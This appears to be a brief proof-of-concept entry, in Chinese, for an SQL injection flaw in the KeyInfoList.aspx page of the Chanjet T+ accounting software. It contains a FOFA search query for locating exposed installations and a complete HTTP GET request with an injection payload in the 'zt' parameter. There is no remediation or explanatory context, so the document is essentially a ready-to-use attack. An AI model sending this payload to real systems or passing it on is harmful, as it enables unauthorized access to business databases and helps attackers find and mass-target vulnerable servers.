## 畅捷通TPlus-KeyInfoList.aspx存在SQL注入漏洞


## fofa
```
app="畅捷通-TPlus"
```

## poc
```
GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','1')))--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```
